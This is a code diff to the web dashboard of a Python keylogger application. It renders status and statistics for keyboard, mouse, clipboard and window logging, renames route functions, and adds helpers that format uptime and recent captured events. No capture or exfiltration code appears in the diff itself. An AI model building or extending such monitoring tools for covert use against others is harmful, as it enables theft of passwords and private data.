@@ -91,11 +91,47 @@ class KeyloggerWebApp:
         def dashboard():
             """Main dashboard."""
             try:
-                stats = self._get_dashboard_stats()
-                return f"Dashboard works! Stats: {stats}"
+                # Get dashboard data
+                dashboard_data = self._get_dashboard_stats()
+                
+                # Prepare data for template
+                status = {
+                    'running': dashboard_data.get('keylogger', {}).get('running', False)
+                }
+                
+                stats = {
+                    'events_logged': dashboard_data.get('keylogger', {}).get('total_events', 0),
+                    'uptime': self._format_uptime(dashboard_data.get('keylogger', {}).get('uptime_hours', 0)),
+                    'memory_usage': f"{dashboard_data.get('system', {}).get('keylogger_memory_mb', 0):.1f} MB"
+                }
+                
+                features = {
+                    'keyboard_logging': dashboard_data.get('components', {}).get('keyboard', {}).get('active', False),
+                    'mouse_logging': dashboard_data.get('components', {}).get('mouse', {}).get('active', False),
+                    'clipboard_monitoring': dashboard_data.get('components', {}).get('clipboard', {}).get('active', False),
+                    'window_monitoring': dashboard_data.get('components', {}).get('window_monitor', {}).get('active', False),
+                    'performance_monitoring': dashboard_data.get('components', {}).get('performance_monitor', {}).get('active', False)
+                }
+                
+                system_info = {
+                    'platform': 'Windows',
+                    'python_version': '3.x',
+                    'cpu_usage': f"{dashboard_data.get('system', {}).get('cpu_percent', 0):.1f}%",
+                    'available_memory': f"{100 - dashboard_data.get('system', {}).get('memory_percent', 0):.1f}%",
+                    'disk_space': f"{100 - dashboard_data.get('system', {}).get('disk_percent', 0):.1f}%"
+                }
+                
+                recent_events = self._format_recent_events(dashboard_data.get('recent_activity', []))
+                
+                return render_template('dashboard.html',
+                                     status=status,
+                                     stats=stats,
+                                     features=features,
+                                     system_info=system_info,
+                                     recent_events=recent_events)
             except Exception as e:
                 logger.error(f"Error loading dashboard: {e}")
-                return f"Dashboard error: {str(e)}", 500
+                return render_template('error.html', error=str(e)), 500
         
         @self.app.route('/test')
         def test_route():
@@ -195,7 +231,7 @@ class KeyloggerWebApp:
                 return jsonify({'error': str(e)}), 500
         
         @self.app.route('/logs')
-        def logs_page():
+        def logs():
             """Logs viewing page."""
             try:
                 page = request.args.get('page', 1, type=int)
@@ -225,7 +261,7 @@ class KeyloggerWebApp:
                 return jsonify({'error': str(e)}), 500
         
         @self.app.route('/config')
-        def config_page():
+        def config():
             """Configuration page."""
             try:
                 config_data = self.config.get_all_config()
@@ -258,7 +294,7 @@ class KeyloggerWebApp:
                 return jsonify({'error': str(e)}), 500
         
         @self.app.route('/export')
-        def export_page():
+        def export():
             """Export page."""
             return render_template('export.html')
         
@@ -287,7 +323,7 @@ class KeyloggerWebApp:
                 return jsonify({'error': str(e)}), 500
         
         @self.app.route('/performance')
-        def performance_page():
+        def performance():
             """Performance monitoring page."""
             try:
                 perf_data = self._get_performance_data()
@@ -515,6 +551,40 @@ class KeyloggerWebApp:
         except Exception as e:
             logger.error(f"Error generating export: {e}")
             return None
+    
+    def _format_uptime(self, uptime_hours: float) -> str:
+        """Format uptime hours into readable string."""
+        try:
+            if uptime_hours < 1:
+                minutes = int(uptime_hours * 60)
+                return f"{minutes}m"
+            elif uptime_hours < 24:
+                hours = int(uptime_hours)
+                minutes = int((uptime_hours - hours) * 60)
+                return f"{hours}h {minutes}m"
+            else:
+                days = int(uptime_hours / 24)
+                hours = int(uptime_hours % 24)
+                return f"{days}d {hours}h"
+        except Exception:
+            return "0m"
+    
+    def _format_recent_events(self, events: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """Format recent events for display."""
+        try:
+            formatted_events = []
+            for event in events[:10]:  # Limit to 10 most recent
+                formatted_event = {
+                    'timestamp': event.get('time', 'Unknown'),
+                    'type': event.get('type', 'Unknown'),
+                    'data': event.get('content', 'No data'),
+                    'window': event.get('window', 'Unknown')
+                }
+                formatted_events.append(formatted_event)
+            return formatted_events
+        except Exception as e:
+            logger.error(f"Error formatting recent events: {e}")
+            return []
     
     def run(self, threaded: bool = True) -> None:
         """Run the web application."""
